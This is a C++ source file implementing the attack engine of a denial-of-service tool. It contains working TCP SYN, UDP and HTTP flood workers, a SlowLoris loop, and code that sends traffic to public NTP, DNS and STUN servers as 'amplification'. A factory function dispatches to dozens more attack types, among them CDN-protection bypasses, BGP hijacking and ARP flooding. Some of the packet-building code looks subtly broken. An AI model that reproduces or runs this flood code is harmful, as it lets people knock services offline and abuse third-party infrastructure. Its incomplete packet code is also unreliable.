#include "attack_engine.h"
#include "header_manager.h"
#include "memory_pool.h"
#include "l7_attacks.h"
#include "l4_attacks.h"
#include "l7_bypass.h"
#include "l7_specialized.h"
#include "l3_attacks.h"
#include "l7_database.h"
#include "l2_attacks.h"
#include "l7_application.h"
#include <cstring>
#include <chrono>
#include <random>
#include <sstream>
#include <mutex>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include "win_tuning.h"
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <netinet/tcp.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket close
#endif

namespace laitoxx {

// Platform-specific socket initialization
class SocketInit {
public:
    SocketInit() {
#ifdef _WIN32
        WSADATA wsa_data;
        WSAStartup(MAKEWORD(2, 2), &wsa_data);
#endif
    }
    ~SocketInit() {
#ifdef _WIN32
        WSACleanup();
#endif
    }
};

static SocketInit socket_init;

// Global memory pool for packet buffers (lock-free, thread-safe)
static PacketPool g_packet_pool;

// Helper: configure socket for high performance
static void setup_socket(SOCKET sock, bool is_tcp = true) {
#ifdef _WIN32
    configure_socket_options(static_cast<uintptr_t>(sock), is_tcp);
#else
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    int sndbuf = 65536;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    if (is_tcp) {
        int nodelay = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
    }
    struct linger lin{};
    lin.l_onoff = 1;
    lin.l_linger = 0;
    setsockopt(sock, SOL_SOCKET, SO_LINGER, &lin, sizeof(lin));
#endif
}

// Utility functions
static std::string get_random_ip() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1, 254);

    std::stringstream ss;
    ss << dis(gen) << "." << dis(gen) << "." << dis(gen) << "." << dis(gen);
    return ss.str();
}

static uint16_t get_random_port() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1024, 65535);
    return static_cast<uint16_t>(dis(gen));
}

// Static member initialization
std::shared_ptr<HeaderManager> BaseAttack::header_manager_ = nullptr;
std::shared_ptr<IPRangeManager> BaseAttack::ip_range_manager_ = nullptr;
bool BaseAttack::managers_initialized_ = false;
static std::mutex managers_mutex;

// BaseAttack implementation
BaseAttack::BaseAttack(const AttackConfig& config)
    : config_(config), stop_flag_(false), packets_sent_(0),
      proxy_success_(0), proxy_failures_(0) {
    // Validate critical fields
    if (config_.thread_count <= 0) config_.thread_count = 1;
    if (config_.duration_seconds <= 0) config_.duration_seconds = 60;
    if (config_.port <= 0 || config_.port > 65535) config_.port = 80;
    initialize_managers();
}

BaseAttack::~BaseAttack() {
    stop();
}

void BaseAttack::initialize_managers() {
    std::lock_guard<std::mutex> lock(managers_mutex);

    if (!managers_initialized_) {
        // Initialize HeaderManager
        header_manager_ = std::make_shared<HeaderManager>();
        if (!config_.headers_dir.empty()) {
            header_manager_->load_headers(config_.headers_dir);
        }

        // Initialize IPRangeManager
        ip_range_manager_ = std::make_shared<IPRangeManager>();
        if (!config_.ip_ranges_dir.empty()) {
            ip_range_manager_->load_ip_ranges(config_.ip_ranges_dir);
        }

        managers_initialized_ = true;
        log("Managers initialized successfully");
    }
}

std::map<std::string, std::string> BaseAttack::generate_headers(const std::string& method_type) {
    if (!header_manager_) {
        return std::map<std::string, std::string>();
    }

    // Build HeaderConfig from AttackConfig
    HeaderConfig hdr_config;
    hdr_config.enable_user_agent = config_.enable_user_agent;
    hdr_config.enable_accept = config_.enable_accept;
    hdr_config.enable_accept_language = config_.enable_accept_language;
    hdr_config.enable_accept_encoding = config_.enable_accept_encoding;
    hdr_config.enable_referer = config_.enable_referer;
    hdr_config.enable_sec_headers = config_.enable_sec_headers;
    hdr_config.enable_client_hints = config_.enable_client_hints;
    hdr_config.enable_proxy_headers = config_.enable_proxy_headers;
    hdr_config.custom_headers = config_.custom_headers;

    return header_manager_->generate_headers(hdr_config, method_type);
}

std::string BaseAttack::get_random_ip_from_range() {
    if (!ip_range_manager_) {
        return "";
    }

    if (!config_.ip_range_name.empty()) {
        return ip_range_manager_->get_random_ip_from_range(config_.ip_range_name);
    }

    return ip_range_manager_->get_random_ip();
}

std::unique_ptr<ProxyConnector> BaseAttack::create_proxy_connector() {
    ProxyConfig proxy_config;
    proxy_config.enabled = config_.use_proxy;
    proxy_config.proxy_type = config_.proxy_type;

    if (!config_.proxy_list.empty()) {
        // Pick random proxy from list
        static std::random_device rd;
        static std::mt19937 gen(rd());
        std::uniform_int_distribution<size_t> dist(0, config_.proxy_list.size() - 1);
        std::string proxy_str = config_.proxy_list[dist(gen)];

        // Parse proxy string (format: host:port or host:port:username:password)
        size_t colon1 = proxy_str.find(':');
        if (colon1 != std::string::npos) {
            proxy_config.proxy_host = proxy_str.substr(0, colon1);
            size_t colon2 = proxy_str.find(':', colon1 + 1);

            if (colon2 != std::string::npos) {
                proxy_config.proxy_port = std::stoi(proxy_str.substr(colon1 + 1, colon2 - colon1 - 1));

                // Check for username:password
                size_t colon3 = proxy_str.find(':', colon2 + 1);
                if (colon3 != std::string::npos) {
                    proxy_config.proxy_username = proxy_str.substr(colon2 + 1, colon3 - colon2 - 1);
                    proxy_config.proxy_password = proxy_str.substr(colon3 + 1);
                }
            } else {
                proxy_config.proxy_port = std::stoi(proxy_str.substr(colon1 + 1));
            }
        }
    }

    proxy_config.retries = config_.proxy_retries;

    return std::make_unique<ProxyConnector>(proxy_config);
}

void BaseAttack::stop() {
    stop_flag_ = true;
    for (auto& thread : threads_) {
        if (thread.joinable()) {
            thread.join();
        }
    }
    threads_.clear();
}

uint64_t BaseAttack::get_packets_sent() const {
    return packets_sent_.load();
}

void BaseAttack::set_log_callback(std::function<void(const std::string&)> callback) {
    log_callback_ = callback;
}

void BaseAttack::log(const std::string& message) {
    if (log_callback_) {
        log_callback_(message);
    }
}

void BaseAttack::worker_loop(std::function<void()> attack_func) {
    auto start_time = std::chrono::steady_clock::now();
    auto duration = std::chrono::seconds(config_.duration_seconds);

    while (!stop_flag_) {
        auto elapsed = std::chrono::steady_clock::now() - start_time;
        if (elapsed >= duration) {
            break;
        }
        attack_func();
    }
}

// TCP SYN Attack
void TCPSynAttack::start() {
    log("Starting TCP SYN attack on " + config_.target_ip + ":" + std::to_string(config_.port));

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&TCPSynAttack::attack_worker, this);
    }
}

void TCPSynAttack::attack_worker() {
    // Pre-resolve target address once
    sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config_.port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        setup_socket(sock, true);

        // Non-blocking connect — sends SYN then we immediately close
        #ifdef _WIN32
            u_long mode = 1;
            ioctlsocket(sock, FIONBIO, &mode);
        #else
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        #endif

        connect(sock, (sockaddr*)&target_addr, sizeof(target_addr));
        packets_sent_++;
        closesocket(sock);
        // No sleep — maximize SYN rate
    });
}

// TCP ACK Attack
void TCPAckAttack::start() {
    log("Starting TCP ACK attack on " + config_.target_ip + ":" + std::to_string(config_.port));

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&TCPAckAttack::attack_worker, this);
    }
}

void TCPAckAttack::attack_worker() {
    // Open raw socket once per worker, reuse across iterations
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return;

    setup_socket(sock, true);

    // Pre-build the raw ACK packet
    char packet[40];
    memset(packet, 0, sizeof(packet));
    packet[0] = 0x45;          // IPv4, header length 5
    packet[9] = IPPROTO_TCP;
    packet[20 + 13] = 0x10;    // ACK flag

    sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config_.port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);

    worker_loop([&]() {
        sendto(sock, packet, sizeof(packet), 0,
               (sockaddr*)&target_addr, sizeof(target_addr));
        packets_sent_++;
    });

    closesocket(sock);
}

// UDP Flood Attack
void UDPFloodAttack::start() {
    log("Starting UDP flood attack on " + config_.target_ip + ":" + std::to_string(config_.port));

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&UDPFloodAttack::attack_worker, this);
    }
}

void UDPFloodAttack::attack_worker() {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;

    setup_socket(sock, false);

    sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config_.port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);

    // Use memory pool for payload buffer
    void* buf = g_packet_pool.allocate();
    char* payload = buf ? static_cast<char*>(buf) : new char[1024];
    memset(payload, 'X', 1024);

    worker_loop([&]() {
        sendto(sock, payload, 1024, 0,
               (sockaddr*)&target_addr, sizeof(target_addr));
        packets_sent_++;
    });

    if (buf) g_packet_pool.deallocate(buf);
    else delete[] payload;
    closesocket(sock);
}

// UDP Bypass Attack
void UDPBypassAttack::start() {
    log("Starting UDP bypass attack on " + config_.target_ip + ":" + std::to_string(config_.port));

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&UDPBypassAttack::attack_worker, this);
    }
}

void UDPBypassAttack::attack_worker() {
    sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config_.port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);

    void* buf = g_packet_pool.allocate();
    char* payload = buf ? static_cast<char*>(buf) : new char[512];
    memset(payload, 'Y', 512);

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == INVALID_SOCKET) return;

        setup_socket(sock, false);

        sockaddr_in source_addr{};
        source_addr.sin_family = AF_INET;
        source_addr.sin_port = htons(get_random_port());
        source_addr.sin_addr.s_addr = INADDR_ANY;
        bind(sock, (sockaddr*)&source_addr, sizeof(source_addr));

        sendto(sock, payload, 512, 0,
               (sockaddr*)&target_addr, sizeof(target_addr));
        packets_sent_++;
        closesocket(sock);
    });

    if (buf) g_packet_pool.deallocate(buf);
    else delete[] payload;
}

// AMP Attack
AMPAttack::AMPAttack(const AttackConfig& config, AMPType type)
    : BaseAttack(config), amp_type_(type) {
}

std::string AMPAttack::get_amp_server() {
    switch (amp_type_) {
        case AMPType::NTP: return "pool.ntp.org";
        case AMPType::DNS: return "8.8.8.8";
        case AMPType::STUN: return "stun.l.google.com";
        case AMPType::WSD: return "239.255.255.250";
        case AMPType::SADP: return "224.0.0.252";
        default: return "8.8.8.8";
    }
}

int AMPAttack::get_amp_port() {
    switch (amp_type_) {
        case AMPType::NTP: return 123;
        case AMPType::DNS: return 53;
        case AMPType::STUN: return 3478;
        case AMPType::WSD: return 3702;
        case AMPType::SADP: return 8000;
        default: return 53;
    }
}

void AMPAttack::start() {
    log("Starting AMP attack via " + get_amp_server());

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&AMPAttack::attack_worker, this);
    }
}

void AMPAttack::attack_worker() {
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) return;

    setup_socket(sock, false);

    sockaddr_in amp_server{};
    amp_server.sin_family = AF_INET;
    amp_server.sin_port = htons(get_amp_port());
    inet_pton(AF_INET, get_amp_server().c_str(), &amp_server.sin_addr);

    char payload[64];
    memset(payload, 0, sizeof(payload));

    worker_loop([&]() {
        sendto(sock, payload, sizeof(payload), 0,
               (sockaddr*)&amp_server, sizeof(amp_server));
        packets_sent_++;
    });

    closesocket(sock);
}

// SlowLoris Attack
void SlowLorisAttack::start() {
    log("Starting SlowLoris attack on " + config_.target_ip + ":" + std::to_string(config_.port));

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&SlowLorisAttack::attack_worker, this);
    }
}

void SlowLorisAttack::attack_worker() {
    std::string headers = "GET / HTTP/1.1\r\n"
                         "Host: " + config_.target_ip + "\r\n"
                         "Accept: text/html\r\n";

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            return;
        }

        sockaddr_in target_addr{};
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(config_.port);
        inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);

        if (connect(sock, (sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            send(sock, headers.c_str(), headers.length(), 0);
            packets_sent_++;
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }

        closesocket(sock);
    });
}

// HTTP Flood Attack
void HTTPFloodAttack::start() {
    log("Starting HTTP flood attack on " + config_.target_ip);

    for (int i = 0; i < config_.thread_count; ++i) {
        threads_.emplace_back(&HTTPFloodAttack::attack_worker, this);
    }
}

std::string HTTPFloodAttack::generate_user_agent() {
    static const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    };
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 2);
    return user_agents[dis(gen)];
}

std::string HTTPFloodAttack::generate_headers() {
    std::stringstream ss;
    ss << "GET / HTTP/1.1\r\n";
    ss << "Host: " << config_.target_ip << "\r\n";
    ss << "User-Agent: " << generate_user_agent() << "\r\n";
    ss << "Accept: text/html,application/xhtml+xml\r\n";
    ss << "Connection: keep-alive\r\n\r\n";
    return ss.str();
}

void HTTPFloodAttack::attack_worker() {
    sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(config_.port);
    inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr.sin_addr);

    // Pre-generate a batch of HTTP request headers to avoid per-packet string alloc
    static constexpr int BATCH_SIZE = 16;
    std::string requests[BATCH_SIZE];
    for (int i = 0; i < BATCH_SIZE; ++i) {
        requests[i] = generate_headers();
    }
    int req_idx = 0;

    worker_loop([&]() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return;

        setup_socket(sock, true);

        if (connect(sock, (sockaddr*)&target_addr, sizeof(target_addr)) == 0) {
            // Send multiple requests on the same connection (keep-alive)
            for (int i = 0; i < 4; ++i) {
                const auto& req = requests[req_idx % BATCH_SIZE];
                send(sock, req.c_str(), static_cast<int>(req.length()), 0);
                packets_sent_++;
                req_idx++;
            }
        }

        closesocket(sock);
    });
}

// Factory function
std::unique_ptr<BaseAttack> create_attack(
    const std::string& attack_type,
    const AttackConfig& config)
{
    if (attack_type == "TCP-SYN") {
        return std::make_unique<TCPSynAttack>(config);
    } else if (attack_type == "TCP-ACK") {
        return std::make_unique<TCPAckAttack>(config);
    } else if (attack_type == "UDP") {
        return std::make_unique<UDPFloodAttack>(config);
    } else if (attack_type == "UDP-BYPASS") {
        return std::make_unique<UDPBypassAttack>(config);
    } else if (attack_type == "NTP") {
        return std::make_unique<AMPAttack>(config, AMPAttack::AMPType::NTP);
    } else if (attack_type == "DNS") {
        return std::make_unique<AMPAttack>(config, AMPAttack::AMPType::DNS);
    } else if (attack_type == "STUN") {
        return std::make_unique<AMPAttack>(config, AMPAttack::AMPType::STUN);
    } else if (attack_type == "WSD") {
        return std::make_unique<AMPAttack>(config, AMPAttack::AMPType::WSD);
    } else if (attack_type == "SADP") {
        return std::make_unique<AMPAttack>(config, AMPAttack::AMPType::SADP);
    } else if (attack_type == "SLOWLORIS") {
        return std::make_unique<SlowLorisAttack>(config);
    } else if (attack_type == "HTTP-FLOOD") {
        return std::make_unique<HTTPFloodAttack>(config);
    }

    // L7 HTTP methods
    else if (attack_type == "GET") {
        return std::make_unique<HTTPGetFlood>(config);
    } else if (attack_type == "POST") {
        return std::make_unique<HTTPPostFlood>(config);
    } else if (attack_type == "HEAD") {
        return std::make_unique<HTTPHeadFlood>(config);
    } else if (attack_type == "OVH") {
        return std::make_unique<OVHBypass>(config);
    } else if (attack_type == "RHEX") {
        return std::make_unique<RHEXAttack>(config);
    } else if (attack_type == "STOMP") {
        return std::make_unique<STOMPAttack>(config);
    } else if (attack_type == "STRESS") {
        return std::make_unique<STRESSAttack>(config);
    } else if (attack_type == "DYN") {
        return std::make_unique<DYNAttack>(config);
    } else if (attack_type == "NULL") {
        return std::make_unique<NULLAttack>(config);
    } else if (attack_type == "COOKIE") {
        return std::make_unique<COOKIEAttack>(config);
    } else if (attack_type == "PPS") {
        return std::make_unique<PPSAttack>(config);
    } else if (attack_type == "EVEN") {
        return std::make_unique<EVENAttack>(config);
    } else if (attack_type == "DOWNLOADER") {
        return std::make_unique<DOWNLOADERAttack>(config);
    }

    // L4 Advanced methods
    else if (attack_type == "ACK") {
        return std::make_unique<ACKFlood>(config);
    } else if (attack_type == "SYNACK") {
        return std::make_unique<SYNACKFlood>(config);
    } else if (attack_type == "RST") {
        return std::make_unique<RSTFlood>(config);
    } else if (attack_type == "FIN") {
        return std::make_unique<FINFlood>(config);
    } else if (attack_type == "ICMP") {
        return std::make_unique<ICMPFlood>(config);
    } else if (attack_type == "ICMP-REDIRECT") {
        return std::make_unique<ICMPRedirect>(config);
    } else if (attack_type == "CPS") {
        return std::make_unique<CPSFlood>(config);
    } else if (attack_type == "CONNECTION") {
        return std::make_unique<CONNECTIONFlood>(config);
    }

    // L4 Additional Amplification
    else if (attack_type == "SNMP") {
        return std::make_unique<SNMPAmp>(config);
    } else if (attack_type == "CHARGEN") {
        return std::make_unique<ChargenAmp>(config);
    } else if (attack_type == "CLDAP") {
        return std::make_unique<CLDAPAmp>(config);
    } else if (attack_type == "RDP-AMP") {
        return std::make_unique<RDPAmp>(config);
    } else if (attack_type == "NETBIOS") {
        return std::make_unique<NetBIOSAmp>(config);
    }

    // L7 Bypass methods
    else if (attack_type == "CLOUDFLARE" || attack_type == "CFB") {
        return std::make_unique<CloudflareBypass>(config);
    } else if (attack_type == "CFBUAM") {
        return std::make_unique<CloudflareUAM>(config);
    } else if (attack_type == "DDOSGUARD" || attack_type == "DGB") {
        return std::make_unique<DDoSGuardBypass>(config);
    } else if (attack_type == "ARVANCLOUD" || attack_type == "AVB") {
        return std::make_unique<ArvanCloudBypass>(config);
    } else if (attack_type == "GOOGLEBOT" || attack_type == "BOT") {
        return std::make_unique<GoogleBotAttack>(config);
    } else if (attack_type == "GOOGLESHIELD" || attack_type == "GSB") {
        return std::make_unique<GoogleShieldBypass>(config);
    } else if (attack_type == "BYPASS") {
        return std::make_unique<BYPASSCombined>(config);
    } else if (attack_type == "KILLER") {
        return std::make_unique<KILLERAttack>(config);
    }

    // L7 Specialized methods (Phase 2)
    else if (attack_type == "WEBSOCKET" || attack_type == "WS") {
        return std::make_unique<WebSocketFlood>(config);
    } else if (attack_type == "HTTP2-STREAM" || attack_type == "H2STREAM") {
        return std::make_unique<HTTP2StreamFlood>(config);
    } else if (attack_type == "HTTP2-HPACK" || attack_type == "H2HPACK") {
        return std::make_unique<HTTP2HPACKBomb>(config);
    } else if (attack_type == "HTTP2-RST" || attack_type == "H2RST") {
        return std::make_unique<HTTP2RSTFlood>(config);
    } else if (attack_type == "HTTP2-SETTINGS" || attack_type == "H2SETTINGS") {
        return std::make_unique<HTTP2SettingsFlood>(config);
    } else if (attack_type == "HTTP3" || attack_type == "QUIC") {
        return std::make_unique<HTTP3QUICFlood>(config);
    } else if (attack_type == "GRAPHQL") {
        return std::make_unique<GraphQLFlood>(config);
    } else if (attack_type == "SMTP") {
        return std::make_unique<SMTPFlood>(config);
    } else if (attack_type == "IMAP") {
        return std::make_unique<IMAPFlood>(config);
    } else if (attack_type == "POP3") {
        return std::make_unique<POP3Flood>(config);
    } else if (attack_type == "SIP") {
        return std::make_unique<SIPFlood>(config);
    } else if (attack_type == "RTP") {
        return std::make_unique<RTPFlood>(config);
    } else if (attack_type == "RTCP") {
        return std::make_unique<RTCPFlood>(config);
    } else if (attack_type == "WEBDAV") {
        return std::make_unique<WebDAVFlood>(config);
    }

    // L3 methods (Phase 2)
    else if (attack_type == "SMURF") {
        return std::make_unique<SmurfAttack>(config);
    } else if (attack_type == "FRAGGLE") {
        return std::make_unique<FraggleAttack>(config);
    } else if (attack_type == "POD" || attack_type == "PING-OF-DEATH") {
        return std::make_unique<PingOfDeath>(config);
    } else if (attack_type == "IPV6-NDP" || attack_type == "NDP") {
        return std::make_unique<IPv6NDPFlood>(config);
    } else if (attack_type == "BGP" || attack_type == "BGP-HIJACK") {
        return std::make_unique<BGPHijacking>(config);
    }

    // L7 Database methods (Phase 3)
    else if (attack_type == "REDIS") {
        return std::make_unique<RedisFlood>(config);
    } else if (attack_type == "MONGODB" || attack_type == "MONGO") {
        return std::make_unique<MongoDBFlood>(config);
    } else if (attack_type == "ELASTICSEARCH" || attack_type == "ELASTIC") {
        return std::make_unique<ElasticSearchFlood>(config);
    }

    // L2 methods (Phase 3)
    else if (attack_type == "ARP" || attack_type == "ARP-FLOOD") {
        return std::make_unique<ARPFlood>(config);
    } else if (attack_type == "VLAN" || attack_type == "VLAN-HOP") {
        return std::make_unique<VLANHopping>(config);
    }

    // L7 Application-Specific (Phase 3)
    else if (attack_type == "WORDPRESS" || attack_type == "WP-XMLRPC") {
        return std::make_unique<WordPressXMLRPC>(config);
    } else if (attack_type == "APACHE-RANGE") {
        return std::make_unique<ApacheRangeExploit>(config);
    } else if (attack_type == "TOR") {
        return std::make_unique<TORFlood>(config);
    } else if (attack_type == "SLOW-HEADERS") {
        return std::make_unique<SlowHeaders>(config);
    } else if (attack_type == "SLOW-POST" || attack_type == "RUDY") {
        return std::make_unique<SlowPOST>(config);
    }

    return nullptr;
}

} // namespace laitoxx
